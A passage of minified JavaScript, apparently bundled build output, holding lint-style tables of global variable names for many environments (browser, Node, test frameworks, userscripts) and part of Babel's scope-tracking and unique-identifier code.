s:!1,defaultStatus:!1,DelayNode:!1,DeviceMotionEvent:!1,DeviceOrientationEvent:!1,devicePixelRatio:!1,dispatchEvent:!1,document:!1,Document:!1,DocumentFragment:!1,DocumentType:!1,DOMError:!1,DOMException:!1,DOMImplementation:!1,DOMMatrix:!1,DOMMatrixReadOnly:!1,DOMParser:!1,DOMPoint:!1,DOMPointReadOnly:!1,DOMQuad:!1,DOMRect:!1,DOMRectReadOnly:!1,DOMStringList:!1,DOMStringMap:!1,DOMTokenList:!1,DragEvent:!1,DynamicsCompressorNode:!1,Element:!1,ErrorEvent:!1,event:!1,Event:!1,EventSource:!1,EventTarget:!1,external:!1,fetch:!1,File:!1,FileList:!1,FileReader:!1,find:!1,focus:!1,FocusEvent:!1,FontFace:!1,FontFaceSetLoadEvent:!1,FormData:!1,frameElement:!1,frames:!1,GainNode:!1,Gamepad:!1,GamepadButton:!1,GamepadEvent:!1,getComputedStyle:!1,getSelection:!1,HashChangeEvent:!1,Headers:!1,history:!1,History:!1,HTMLAllCollection:!1,HTMLAnchorElement:!1,HTMLAreaElement:!1,HTMLAudioElement:!1,HTMLBaseElement:!1,HTMLBodyElement:!1,HTMLBRElement:!1,HTMLButtonElement:!1,HTMLCanvasElement:!1,HTMLCollection:!1,HTMLContentElement:!1,HTMLDataElement:!1,HTMLDataListElement:!1,HTMLDetailsElement:!1,HTMLDialogElement:!1,HTMLDirectoryElement:!1,HTMLDivElement:!1,HTMLDListElement:!1,HTMLDocument:!1,HTMLElement:!1,HTMLEmbedElement:!1,HTMLFieldSetElement:!1,HTMLFontElement:!1,HTMLFormControlsCollection:!1,HTMLFormElement:!1,HTMLFrameElement:!1,HTMLFrameSetElement:!1,HTMLHeadElement:!1,HTMLHeadingElement:!1,HTMLHRElement:!1,HTMLHtmlElement:!1,HTMLIFrameElement:!1,HTMLImageElement:!1,HTMLInputElement:!1,HTMLLabelElement:!1,HTMLLegendElement:!1,HTMLLIElement:!1,HTMLLinkElement:!1,HTMLMapElement:!1,HTMLMarqueeElement:!1,HTMLMediaElement:!1,HTMLMenuElement:!1,HTMLMetaElement:!1,HTMLMeterElement:!1,HTMLModElement:!1,HTMLObjectElement:!1,HTMLOListElement:!1,HTMLOptGroupElement:!1,HTMLOptionElement:!1,HTMLOptionsCollection:!1,HTMLOutputElement:!1,HTMLParagraphElement:!1,HTMLParamElement:!1,HTMLPictureElement:!1,HTMLPreElement:!1,HTMLProgressElement:!1,HTMLQuoteElement:!1,HTMLScriptElement:!1,HTMLSelectElement:!1,HTMLShadowElement:!1,HTMLSlotElement:!1,HTMLSourceElement:!1,HTMLSpanElement:!1,HTMLStyleElement:!1,HTMLTableCaptionElement:!1,HTMLTableCellElement:!1,HTMLTableColElement:!1,HTMLTableElement:!1,HTMLTableRowElement:!1,HTMLTableSectionElement:!1,HTMLTemplateElement:!1,HTMLTextAreaElement:!1,HTMLTimeElement:!1,HTMLTitleElement:!1,HTMLTrackElement:!1,HTMLUListElement:!1,HTMLUnknownElement:!1,HTMLVideoElement:!1,IDBCursor:!1,IDBCursorWithValue:!1,IDBDatabase:!1,IDBFactory:!1,IDBIndex:!1,IDBKeyRange:!1,IDBObjectStore:!1,IDBOpenDBRequest:!1,IDBRequest:!1,IDBTransaction:!1,IDBVersionChangeEvent:!1,IdleDeadline:!1,IIRFilterNode:!1,Image:!1,ImageBitmap:!1,ImageBitmapRenderingContext:!1,ImageCapture:!1,ImageData:!1,indexedDB:!1,innerHeight:!1,innerWidth:!1,InputEvent:!1,IntersectionObserver:!1,IntersectionObserverEntry:!1,Intl:!1,isSecureContext:!1,KeyboardEvent:!1,KeyframeEffect:!1,KeyframeEffectReadOnly:!1,length:!1,localStorage:!1,location:!0,Location:!1,locationbar:!1,matchMedia:!1,MediaDeviceInfo:!1,MediaDevices:!1,MediaElementAudioSourceNode:!1,MediaEncryptedEvent:!1,MediaError:!1,MediaKeyMessageEvent:!1,MediaKeySession:!1,MediaKeyStatusMap:!1,MediaKeySystemAccess:!1,MediaList:!1,MediaQueryList:!1,MediaQueryListEvent:!1,MediaRecorder:!1,MediaSettingsRange:!1,MediaSource:!1,MediaStream:!1,MediaStreamAudioDestinationNode:!1,MediaStreamAudioSourceNode:!1,MediaStreamEvent:!1,MediaStreamTrack:!1,MediaStreamTrackEvent:!1,menubar:!1,MessageChannel:!1,MessageEvent:!1,MessagePort:!1,MIDIAccess:!1,MIDIConnectionEvent:!1,MIDIInput:!1,MIDIInputMap:!1,MIDIMessageEvent:!1,MIDIOutput:!1,MIDIOutputMap:!1,MIDIPort:!1,MimeType:!1,MimeTypeArray:!1,MouseEvent:!1,moveBy:!1,moveTo:!1,MutationEvent:!1,MutationObserver:!1,MutationRecord:!1,name:!1,NamedNodeMap:!1,NavigationPreloadManager:!1,navigator:!1,Navigator:!1,NetworkInformation:!1,Node:!1,NodeFilter:!1,NodeIterator:!1,NodeList:!1,Notification:!1,OfflineAudioCompletionEvent:!1,OfflineAudioContext:!1,offscreenBuffering:!1,OffscreenCanvas:!0,onabort:!0,onafterprint:!0,onanimationend:!0,onanimationiteration:!0,onanimationstart:!0,onappinstalled:!0,onauxclick:!0,onbeforeinstallprompt:!0,onbeforeprint:!0,onbeforeunload:!0,onblur:!0,oncancel:!0,oncanplay:!0,oncanplaythrough:!0,onchange:!0,onclick:!0,onclose:!0,oncontextmenu:!0,oncuechange:!0,ondblclick:!0,ondevicemotion:!0,ondeviceorientation:!0,ondeviceorientationabsolute:!0,ondrag:!0,ondragend:!0,ondragenter:!0,ondragleave:!0,ondragover:!0,ondragstart:!0,ondrop:!0,ondurationchange:!0,onemptied:!0,onended:!0,onerror:!0,onfocus:!0,ongotpointercapture:!0,onhashchange:!0,oninput:!0,oninvalid:!0,onkeydown:!0,onkeypress:!0,onkeyup:!0,onlanguagechange:!0,onload:!0,onloadeddata:!0,onloadedmetadata:!0,onloadstart:!0,onlostpointercapture:!0,onmessage:!0,onmessageerror:!0,onmousedown:!0,onmouseenter:!0,onmouseleave:!0,onmousemove:!0,onmouseout:!0,onmouseover:!0,onmouseup:!0,onmousewheel:!0,onoffline:!0,ononline:!0,onpagehide:!0,onpageshow:!0,onpause:!0,onplay:!0,onplaying:!0,onpointercancel:!0,onpointerdown:!0,onpointerenter:!0,onpointerleave:!0,onpointermove:!0,onpointerout:!0,onpointerover:!0,onpointerup:!0,onpopstate:!0,onprogress:!0,onratechange:!0,onrejectionhandled:!0,onreset:!0,onresize:!0,onscroll:!0,onsearch:!0,onseeked:!0,onseeking:!0,onselect:!0,onstalled:!0,onstorage:!0,onsubmit:!0,onsuspend:!0,ontimeupdate:!0,ontoggle:!0,ontransitionend:!0,onunhandledrejection:!0,onunload:!0,onvolumechange:!0,onwaiting:!0,onwheel:!0,open:!1,openDatabase:!1,opener:!1,Option:!1,origin:!1,OscillatorNode:!1,outerHeight:!1,outerWidth:!1,PageTransitionEvent:!1,pageXOffset:!1,pageYOffset:!1,PannerNode:!1,parent:!1,Path2D:!1,PaymentAddress:!1,PaymentRequest:!1,PaymentRequestUpdateEvent:!1,PaymentResponse:!1,performance:!1,Performance:!1,PerformanceEntry:!1,PerformanceLongTaskTiming:!1,PerformanceMark:!1,PerformanceMeasure:!1,PerformanceNavigation:!1,PerformanceNavigationTiming:!1,PerformanceObserver:!1,PerformanceObserverEntryList:!1,PerformancePaintTiming:!1,PerformanceResourceTiming:!1,PerformanceTiming:!1,PeriodicWave:!1,Permissions:!1,PermissionStatus:!1,personalbar:!1,PhotoCapabilities:!1,Plugin:!1,PluginArray:!1,PointerEvent:!1,PopStateEvent:!1,postMessage:!1,Presentation:!1,PresentationAvailability:!1,PresentationConnection:!1,PresentationConnectionAvailableEvent:!1,PresentationConnectionCloseEvent:!1,PresentationConnectionList:!1,PresentationReceiver:!1,PresentationRequest:!1,print:!1,ProcessingInstruction:!1,ProgressEvent:!1,PromiseRejectionEvent:!1,prompt:!1,PushManager:!1,PushSubscription:!1,PushSubscriptionOptions:!1,queueMicrotask:!1,RadioNodeList:!1,Range:!1,ReadableStream:!1,registerProcessor:!1,RemotePlayback:!1,removeEventListener:!1,Request:!1,requestAnimationFrame:!1,requestIdleCallback:!1,resizeBy:!1,ResizeObserver:!1,ResizeObserverEntry:!1,resizeTo:!1,Response:!1,RTCCertificate:!1,RTCDataChannel:!1,RTCDataChannelEvent:!1,RTCDtlsTransport:!1,RTCIceCandidate:!1,RTCIceGatherer:!1,RTCIceTransport:!1,RTCPeerConnection:!1,RTCPeerConnectionIceEvent:!1,RTCRtpContributingSource:!1,RTCRtpReceiver:!1,RTCRtpSender:!1,RTCSctpTransport:!1,RTCSessionDescription:!1,RTCStatsReport:!1,RTCTrackEvent:!1,screen:!1,Screen:!1,screenLeft:!1,ScreenOrientation:!1,screenTop:!1,screenX:!1,screenY:!1,ScriptProcessorNode:!1,scroll:!1,scrollbars:!1,scrollBy:!1,scrollTo:!1,scrollX:!1,scrollY:!1,SecurityPolicyViolationEvent:!1,Selection:!1,self:!1,ServiceWorker:!1,ServiceWorkerContainer:!1,ServiceWorkerRegistration:!1,sessionStorage:!1,setInterval:!1,setTimeout:!1,ShadowRoot:!1,SharedWorker:!1,SourceBuffer:!1,SourceBufferList:!1,speechSynthesis:!1,SpeechSynthesisEvent:!1,SpeechSynthesisUtterance:!1,StaticRange:!1,status:!1,statusbar:!1,StereoPannerNode:!1,stop:!1,Storage:!1,StorageEvent:!1,StorageManager:!1,styleMedia:!1,StyleSheet:!1,StyleSheetList:!1,SubtleCrypto:!1,SVGAElement:!1,SVGAngle:!1,SVGAnimatedAngle:!1,SVGAnimatedBoolean:!1,SVGAnimatedEnumeration:!1,SVGAnimatedInteger:!1,SVGAnimatedLength:!1,SVGAnimatedLengthList:!1,SVGAnimatedNumber:!1,SVGAnimatedNumberList:!1,SVGAnimatedPreserveAspectRatio:!1,SVGAnimatedRect:!1,SVGAnimatedString:!1,SVGAnimatedTransformList:!1,SVGAnimateElement:!1,SVGAnimateMotionElement:!1,SVGAnimateTransformElement:!1,SVGAnimationElement:!1,SVGCircleElement:!1,SVGClipPathElement:!1,SVGComponentTransferFunctionElement:!1,SVGDefsElement:!1,SVGDescElement:!1,SVGDiscardElement:!1,SVGElement:!1,SVGEllipseElement:!1,SVGFEBlendElement:!1,SVGFEColorMatrixElement:!1,SVGFEComponentTransferElement:!1,SVGFECompositeElement:!1,SVGFEConvolveMatrixElement:!1,SVGFEDiffuseLightingElement:!1,SVGFEDisplacementMapElement:!1,SVGFEDistantLightElement:!1,SVGFEDropShadowElement:!1,SVGFEFloodElement:!1,SVGFEFuncAElement:!1,SVGFEFuncBElement:!1,SVGFEFuncGElement:!1,SVGFEFuncRElement:!1,SVGFEGaussianBlurElement:!1,SVGFEImageElement:!1,SVGFEMergeElement:!1,SVGFEMergeNodeElement:!1,SVGFEMorphologyElement:!1,SVGFEOffsetElement:!1,SVGFEPointLightElement:!1,SVGFESpecularLightingElement:!1,SVGFESpotLightElement:!1,SVGFETileElement:!1,SVGFETurbulenceElement:!1,SVGFilterElement:!1,SVGForeignObjectElement:!1,SVGGElement:!1,SVGGeometryElement:!1,SVGGradientElement:!1,SVGGraphicsElement:!1,SVGImageElement:!1,SVGLength:!1,SVGLengthList:!1,SVGLinearGradientElement:!1,SVGLineElement:!1,SVGMarkerElement:!1,SVGMaskElement:!1,SVGMatrix:!1,SVGMetadataElement:!1,SVGMPathElement:!1,SVGNumber:!1,SVGNumberList:!1,SVGPathElement:!1,SVGPatternElement:!1,SVGPoint:!1,SVGPointList:!1,SVGPolygonElement:!1,SVGPolylineElement:!1,SVGPreserveAspectRatio:!1,SVGRadialGradientElement:!1,SVGRect:!1,SVGRectElement:!1,SVGScriptElement:!1,SVGSetElement:!1,SVGStopElement:!1,SVGStringList:!1,SVGStyleElement:!1,SVGSVGElement:!1,SVGSwitchElement:!1,SVGSymbolElement:!1,SVGTextContentElement:!1,SVGTextElement:!1,SVGTextPathElement:!1,SVGTextPositioningElement:!1,SVGTitleElement:!1,SVGTransform:!1,SVGTransformList:!1,SVGTSpanElement:!1,SVGUnitTypes:!1,SVGUseElement:!1,SVGViewElement:!1,TaskAttributionTiming:!1,Text:!1,TextDecoder:!1,TextEncoder:!1,TextEvent:!1,TextMetrics:!1,TextTrack:!1,TextTrackCue:!1,TextTrackCueList:!1,TextTrackList:!1,TimeRanges:!1,toolbar:!1,top:!1,Touch:!1,TouchEvent:!1,TouchList:!1,TrackEvent:!1,TransitionEvent:!1,TreeWalker:!1,UIEvent:!1,URL:!1,URLSearchParams:!1,ValidityState:!1,visualViewport:!1,VisualViewport:!1,VTTCue:!1,WaveShaperNode:!1,WebAssembly:!1,WebGL2RenderingContext:!1,WebGLActiveInfo:!1,WebGLBuffer:!1,WebGLContextEvent:!1,WebGLFramebuffer:!1,WebGLProgram:!1,WebGLQuery:!1,WebGLRenderbuffer:!1,WebGLRenderingContext:!1,WebGLSampler:!1,WebGLShader:!1,WebGLShaderPrecisionFormat:!1,WebGLSync:!1,WebGLTexture:!1,WebGLTransformFeedback:!1,WebGLUniformLocation:!1,WebGLVertexArrayObject:!1,WebSocket:!1,WheelEvent:!1,window:!1,Window:!1,Worker:!1,WritableStream:!1,XMLDocument:!1,XMLHttpRequest:!1,XMLHttpRequestEventTarget:!1,XMLHttpRequestUpload:!1,XMLSerializer:!1,XPathEvaluator:!1,XPathExpression:!1,XPathResult:!1,XSLTProcessor:!1},worker:{addEventListener:!1,applicationCache:!1,atob:!1,Blob:!1,BroadcastChannel:!1,btoa:!1,Cache:!1,caches:!1,clearInterval:!1,clearTimeout:!1,close:!0,console:!1,fetch:!1,FileReaderSync:!1,FormData:!1,Headers:!1,IDBCursor:!1,IDBCursorWithValue:!1,IDBDatabase:!1,IDBFactory:!1,IDBIndex:!1,IDBKeyRange:!1,IDBObjectStore:!1,IDBOpenDBRequest:!1,IDBRequest:!1,IDBTransaction:!1,IDBVersionChangeEvent:!1,ImageData:!1,importScripts:!0,indexedDB:!1,location:!1,MessageChannel:!1,MessagePort:!1,name:!1,navigator:!1,Notification:!1,onclose:!0,onconnect:!0,onerror:!0,onlanguagechange:!0,onmessage:!0,onoffline:!0,ononline:!0,onrejectionhandled:!0,onunhandledrejection:!0,performance:!1,Performance:!1,PerformanceEntry:!1,PerformanceMark:!1,PerformanceMeasure:!1,PerformanceNavigation:!1,PerformanceResourceTiming:!1,PerformanceTiming:!1,postMessage:!0,Promise:!1,queueMicrotask:!1,removeEventListener:!1,Request:!1,Response:!1,self:!0,ServiceWorkerRegistration:!1,setInterval:!1,setTimeout:!1,TextDecoder:!1,TextEncoder:!1,URL:!1,URLSearchParams:!1,WebSocket:!1,Worker:!1,WorkerGlobalScope:!1,XMLHttpRequest:!1},node:{__dirname:!1,__filename:!1,Buffer:!1,clearImmediate:!1,clearInterval:!1,clearTimeout:!1,console:!1,exports:!0,global:!1,Intl:!1,module:!1,process:!1,queueMicrotask:!1,require:!1,setImmediate:!1,setInterval:!1,setTimeout:!1,TextDecoder:!1,TextEncoder:!1,URL:!1,URLSearchParams:!1},commonjs:{exports:!0,global:!1,module:!1,require:!1},amd:{define:!1,require:!1},mocha:{after:!1,afterEach:!1,before:!1,beforeEach:!1,context:!1,describe:!1,it:!1,mocha:!1,run:!1,setup:!1,specify:!1,suite:!1,suiteSetup:!1,suiteTeardown:!1,teardown:!1,test:!1,xcontext:!1,xdescribe:!1,xit:!1,xspecify:!1},jasmine:{afterAll:!1,afterEach:!1,beforeAll:!1,beforeEach:!1,describe:!1,expect:!1,fail:!1,fdescribe:!1,fit:!1,it:!1,jasmine:!1,pending:!1,runs:!1,spyOn:!1,spyOnProperty:!1,waits:!1,waitsFor:!1,xdescribe:!1,xit:!1},jest:{afterAll:!1,afterEach:!1,beforeAll:!1,beforeEach:!1,describe:!1,expect:!1,fdescribe:!1,fit:!1,it:!1,jest:!1,pit:!1,require:!1,test:!1,xdescribe:!1,xit:!1,xtest:!1},qunit:{asyncTest:!1,deepEqual:!1,equal:!1,expect:!1,module:!1,notDeepEqual:!1,notEqual:!1,notOk:!1,notPropEqual:!1,notStrictEqual:!1,ok:!1,propEqual:!1,QUnit:!1,raises:!1,start:!1,stop:!1,strictEqual:!1,test:!1,throws:!1},phantomjs:{console:!0,exports:!0,phantom:!0,require:!0,WebPage:!0},couch:{emit:!1,exports:!1,getRow:!1,log:!1,module:!1,provides:!1,require:!1,respond:!1,send:!1,start:!1,sum:!1},rhino:{defineClass:!1,deserialize:!1,gc:!1,help:!1,importClass:!1,importPackage:!1,java:!1,load:!1,loadClass:!1,Packages:!1,print:!1,quit:!1,readFile:!1,readUrl:!1,runCommand:!1,seal:!1,serialize:!1,spawn:!1,sync:!1,toint32:!1,version:!1},nashorn:{__DIR__:!1,__FILE__:!1,__LINE__:!1,com:!1,edu:!1,exit:!1,java:!1,Java:!1,javafx:!1,JavaImporter:!1,javax:!1,JSAdapter:!1,load:!1,loadWithNewGlobal:!1,org:!1,Packages:!1,print:!1,quit:!1},wsh:{ActiveXObject:!0,Enumerator:!0,GetObject:!0,ScriptEngine:!0,ScriptEngineBuildVersion:!0,ScriptEngineMajorVersion:!0,ScriptEngineMinorVersion:!0,VBArray:!0,WScript:!0,WSH:!0,XDomainRequest:!0},jquery:{$:!1,jQuery:!1},yui:{YAHOO:!1,YAHOO_config:!1,YUI:!1,YUI_config:!1},shelljs:{cat:!1,cd:!1,chmod:!1,config:!1,cp:!1,dirs:!1,echo:!1,env:!1,error:!1,exec:!1,exit:!1,find:!1,grep:!1,ln:!1,ls:!1,mkdir:!1,mv:!1,popd:!1,pushd:!1,pwd:!1,rm:!1,sed:!1,set:!1,target:!1,tempdir:!1,test:!1,touch:!1,which:!1},prototypejs:{$:!1,$$:!1,$A:!1,$break:!1,$continue:!1,$F:!1,$H:!1,$R:!1,$w:!1,Abstract:!1,Ajax:!1,Autocompleter:!1,Builder:!1,Class:!1,Control:!1,Draggable:!1,Draggables:!1,Droppables:!1,Effect:!1,Element:!1,Enumerable:!1,Event:!1,Field:!1,Form:!1,Hash:!1,Insertion:!1,ObjectRange:!1,PeriodicalExecuter:!1,Position:!1,Prototype:!1,Scriptaculous:!1,Selector:!1,Sortable:!1,SortableObserver:!1,Sound:!1,Template:!1,Toggle:!1,Try:!1},meteor:{_:!1,$:!1,Accounts:!1,AccountsClient:!1,AccountsCommon:!1,AccountsServer:!1,App:!1,Assets:!1,Blaze:!1,check:!1,Cordova:!1,DDP:!1,DDPRateLimiter:!1,DDPServer:!1,Deps:!1,EJSON:!1,Email:!1,HTTP:!1,Log:!1,Match:!1,Meteor:!1,Mongo:!1,MongoInternals:!1,Npm:!1,Package:!1,Plugin:!1,process:!1,Random:!1,ReactiveDict:!1,ReactiveVar:!1,Router:!1,ServiceConfiguration:!1,Session:!1,share:!1,Spacebars:!1,Template:!1,Tinytest:!1,Tracker:!1,UI:!1,Utils:!1,WebApp:!1,WebAppInternals:!1},mongo:{_isWindows:!1,_rand:!1,BulkWriteResult:!1,cat:!1,cd:!1,connect:!1,db:!1,getHostName:!1,getMemInfo:!1,hostname:!1,ISODate:!1,listFiles:!1,load:!1,ls:!1,md5sumFile:!1,mkdir:!1,Mongo:!1,NumberInt:!1,NumberLong:!1,ObjectId:!1,PlanCache:!1,print:!1,printjson:!1,pwd:!1,quit:!1,removeFile:!1,rs:!1,sh:!1,UUID:!1,version:!1,WriteResult:!1},applescript:{$:!1,Application:!1,Automation:!1,console:!1,delay:!1,Library:!1,ObjC:!1,ObjectSpecifier:!1,Path:!1,Progress:!1,Ref:!1},serviceworker:{addEventListener:!1,applicationCache:!1,atob:!1,Blob:!1,BroadcastChannel:!1,btoa:!1,Cache:!1,caches:!1,CacheStorage:!1,clearInterval:!1,clearTimeout:!1,Client:!1,clients:!1,Clients:!1,close:!0,console:!1,ExtendableEvent:!1,ExtendableMessageEvent:!1,fetch:!1,FetchEvent:!1,FileReaderSync:!1,FormData:!1,Headers:!1,IDBCursor:!1,IDBCursorWithValue:!1,IDBDatabase:!1,IDBFactory:!1,IDBIndex:!1,IDBKeyRange:!1,IDBObjectStore:!1,IDBOpenDBRequest:!1,IDBRequest:!1,IDBTransaction:!1,IDBVersionChangeEvent:!1,ImageData:!1,importScripts:!1,indexedDB:!1,location:!1,MessageChannel:!1,MessagePort:!1,name:!1,navigator:!1,Notification:!1,onclose:!0,onconnect:!0,onerror:!0,onfetch:!0,oninstall:!0,onlanguagechange:!0,onmessage:!0,onmessageerror:!0,onnotificationclick:!0,onnotificationclose:!0,onoffline:!0,ononline:!0,onpush:!0,onpushsubscriptionchange:!0,onrejectionhandled:!0,onsync:!0,onunhandledrejection:!0,performance:!1,Performance:!1,PerformanceEntry:!1,PerformanceMark:!1,PerformanceMeasure:!1,PerformanceNavigation:!1,PerformanceResourceTiming:!1,PerformanceTiming:!1,postMessage:!0,Promise:!1,queueMicrotask:!1,registration:!1,removeEventListener:!1,Request:!1,Response:!1,self:!1,ServiceWorker:!1,ServiceWorkerContainer:!1,ServiceWorkerGlobalScope:!1,ServiceWorkerMessageEvent:!1,ServiceWorkerRegistration:!1,setInterval:!1,setTimeout:!1,skipWaiting:!1,TextDecoder:!1,TextEncoder:!1,URL:!1,URLSearchParams:!1,WebSocket:!1,WindowClient:!1,Worker:!1,WorkerGlobalScope:!1,XMLHttpRequest:!1},atomtest:{advanceClock:!1,fakeClearInterval:!1,fakeClearTimeout:!1,fakeSetInterval:!1,fakeSetTimeout:!1,resetTimeouts:!1,waitsForPromise:!1},embertest:{andThen:!1,click:!1,currentPath:!1,currentRouteName:!1,currentURL:!1,fillIn:!1,find:!1,findAll:!1,findWithAssert:!1,keyEvent:!1,pauseTest:!1,resumeTest:!1,triggerEvent:!1,visit:!1,wait:!1},protractor:{$:!1,$$:!1,browser:!1,by:!1,By:!1,DartObject:!1,element:!1,protractor:!1},\"shared-node-browser\":{clearInterval:!1,clearTimeout:!1,console:!1,setInterval:!1,setTimeout:!1,URL:!1,URLSearchParams:!1},webextensions:{browser:!1,chrome:!1,opr:!1},greasemonkey:{cloneInto:!1,createObjectIn:!1,exportFunction:!1,GM:!1,GM_addStyle:!1,GM_deleteValue:!1,GM_getResourceText:!1,GM_getResourceURL:!1,GM_getValue:!1,GM_info:!1,GM_listValues:!1,GM_log:!1,GM_openInTab:!1,GM_registerMenuCommand:!1,GM_setClipboard:!1,GM_setValue:!1,GM_xmlhttpRequest:!1,unsafeWindow:!1},devtools:{$:!1,$_:!1,$$:!1,$0:!1,$1:!1,$2:!1,$3:!1,$4:!1,$x:!1,chrome:!1,clear:!1,copy:!1,debug:!1,dir:!1,dirxml:!1,getEventListeners:!1,inspect:!1,keys:!1,monitor:!1,monitorEvents:!1,profile:!1,profileEnd:!1,queryObjects:!1,table:!1,undebug:!1,unmonitor:!1,unmonitorEvents:!1,values:!1}}});var yS=E((xCe,mS)=>{\"use strict\";mS.exports=hS()});var dm=E(du=>{\"use strict\";Object.defineProperty(du,\"__esModule\",{value:!0});du.default=void 0;var yY=pS(),gY=Xr(),bY=dS(),EY=yS(),CS=De(),vY=CS,gS=Xs(),TY=ro(),{NOT_LOCAL_BINDING:bS,callExpression:ES,cloneNode:vS,getBindingIdentifiers:SY,identifier:qi,isArrayExpression:TS,isBinary:xY,isCallExpression:SS,isClass:PY,isClassBody:AY,isClassDeclaration:CY,isExportAllDeclaration:wS,isExportDefaultDeclaration:wY,isExportNamedDeclaration:cm,isFunctionDeclaration:DY,isIdentifier:Qs,isImportDeclaration:fm,isLiteral:IY,isMemberExpression:OY,isMethod:_Y,isModuleSpecifier:NY,isNullLiteral:kY,isObjectExpression:BY,isProperty:FY,isPureish:jY,isRegExpLiteral:LY,isSuper:MY,isTaggedTemplateExpression:RY,isTemplateLiteral:DS,isThisExpression:xS,isUnaryExpression:qY,isVariableDeclaration:UY,matchesPattern:PS,memberExpression:pm,numericLiteral:VY,toIdentifier:$Y,variableDeclaration:WY,variableDeclarator:KY,isRecordExpression:GY,isTupleExpression:HY,isObjectProperty:YY,isTopicReference:AS,isMetaProperty:XY,isPrivateName:JY,isExportDeclaration:zY,buildUndefinedNode:QY}=CS;function St(e,t){switch(e==null?void 0:e.type){default:if(fm(e)||zY(e)){var r;if((wS(e)||cm(e)||fm(e))&&e.source)St(e.source,t);else if((cm(e)||fm(e))&&(r=e.specifiers)!=null&&r.length)for(let n of e.specifiers)St(n,t);else(wY(e)||cm(e))&&e.declaration&&St(e.declaration,t)}else NY(e)?St(e.local,t):IY(e)&&!kY(e)&&!LY(e)&&!DS(e)&&t.push(e.value);break;case\"MemberExpression\":case\"OptionalMemberExpression\":case\"JSXMemberExpression\":St(e.object,t),St(e.property,t);break;case\"Identifier\":case\"JSXIdentifier\":t.push(e.name);break;case\"CallExpression\":case\"OptionalCallExpression\":case\"NewExpression\":St(e.callee,t);break;case\"ObjectExpression\":case\"ObjectPattern\":for(let n of e.properties)St(n,t);break;case\"SpreadElement\":case\"RestElement\":St(e.argument,t);break;case\"ObjectProperty\":case\"ObjectMethod\":case\"ClassProperty\":case\"ClassMethod\":case\"ClassPrivateProperty\":case\"ClassPrivateMethod\":St(e.key,t);break;case\"ThisExpression\":t.push(\"this\");break;case\"Super\":t.push(\"super\");break;case\"Import\":t.push(\"import\");break;case\"DoExpression\":t.push(\"do\");break;case\"YieldExpression\":t.push(\"yield\"),St(e.argument,t);break;case\"AwaitExpression\":t.push(\"await\"),St(e.argument,t);break;case\"AssignmentExpression\":St(e.left,t);break;case\"VariableDeclarator\":St(e.id,t);break;case\"FunctionExpression\":case\"FunctionDeclaration\":case\"ClassExpression\":case\"ClassDeclaration\":St(e.id,t);break;case\"PrivateName\":St(e.id,t);break;case\"ParenthesizedExpression\":St(e.expression,t);break;case\"UnaryExpression\":case\"UpdateExpression\":St(e.argument,t);break;case\"MetaProperty\":St(e.meta,t),St(e.property,t);break;case\"JSXElement\":St(e.openingElement,t);break;case\"JSXOpeningElement\":St(e.name,t);break;case\"JSXFragment\":St(e.openingFragment,t);break;case\"JSXOpeningFragment\":t.push(\"Fragment\");break;case\"JSXNamespacedName\":St(e.namespace,t),St(e.name,t);break}}var pu={ForStatement(e){let t=e.get(\"init\");if(t.isVar()){let{scope:r}=e;(r.getFunctionParent()||r.getProgramParent()).registerBinding(\"var\",t)}},Declaration(e){if(e.isBlockScoped()||e.isImportDeclaration()||e.isExportDeclaration())return;(e.scope.getFunctionParent()||e.scope.getProgramParent()).registerDeclaration(e)},ImportDeclaration(e){e.scope.getBlockParent().registerDeclaration(e)},ReferencedIdentifier(e,t){t.references.push(e)},ForXStatement(e,t){let r=e.get(\"left\");if(r.isPattern()||r.isIdentifier())t.constantViolations.push(e);else if(r.isVar()){let{scope:n}=e;(n.getFunctionParent()||n.getProgramParent()).registerBinding(\"var\",r)}},ExportDeclaration:{exit(e){let{node:t,scope:r}=e;if(wS(t))return;let n=t.declaration;if(CY(n)||DY(n)){let s=n.id;if(!s)return;let i=r.getBinding(s.name);i==null||i.reference(e)}else if(UY(n))for(let s of n.declarations)for(let i of Object.keys(SY(s))){let a=r.getBinding(i);a==null||a.reference(e)}}},LabeledStatement(e){e.scope.getBlockParent().registerDeclaration(e)},AssignmentExpression(e,t){t.assignments.push(e)},UpdateExpression(e,t){t.constantViolations.push(e)},UnaryExpression(e,t){e.node.operator===\"delete\"&&t.constantViolations.push(e)},BlockScoped(e){let t=e.scope;if(t.path===e&&(t=t.parent),t.getBlockParent().registerDeclaration(e),e.isClassDeclaration()&&e.node.id){let s=e.node.id.name;e.scope.bindings[s]=e.scope.parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,this.references=void 0,this.globals=void 0,this.uids=void 0,this.data=void 0,this.crawling=void 0;let{node:r}=t,n=gS.scope.get(r);if((n==null?void 0:n.path)===t)return n;gS.scope.set(r,this),this.uid=ZY++,this.block=r,this.path=t,this.labels=new Map,this.inited=!1}get parent(){var t;let r,n=this.path;do{let s=n.key===\"key\"||n.listKey===\"decorators\";n=n.parentPath,s&&n.isMethod()&&(n=n.parentPath),n&&n.isScope()&&(r=n)}while(n&&!r);return(t=r)==null?void 0:t.scope}get parentBlock(){return this.path.parent}get hub(){return this.path.hub}traverse(t,r,n){(0,gY.default)(t,r,this,n,this.path)}generateDeclaredUidIdentifier(t){let r=this.generateUidIdentifier(t);return this.push({id:r}),vS(r)}generateUidIdentifier(t){return qi(this.generateUid(t))}generateUid(t=\"temp\"){t=$Y(t).replace(/^_+/,\"\").replace(/[0-9]+$/g,\"\");let r,n=1;do r=this._generateUid(t,n),n++;while(this.hasLabel(r)||this.hasBinding(r)||this.hasGlobal(r)||this.hasReference(r));let s=this.getProgramParent();return s.references[r]=!0,s.uids[r]=!0,r}_generateUid(t,r){let n=t;return r>1&&(n+=r),`_${n}`}generateUidBasedOnNode(t,r){let n=[];St(t,n);let s=n.join(\"$\");return s=s.replace(/^_/,\"\")||r||\"ref\",this.generateUid(s.slice(0,20))}generateUidIdentifierBasedOnNode(t,r){return qi(this.generateUidBasedOnNode(t,r))}isStatic(t){if(xS(t)||MY(t)||AS(t))return!0;if(Qs(t)){let r=this.getBinding(t.name);return 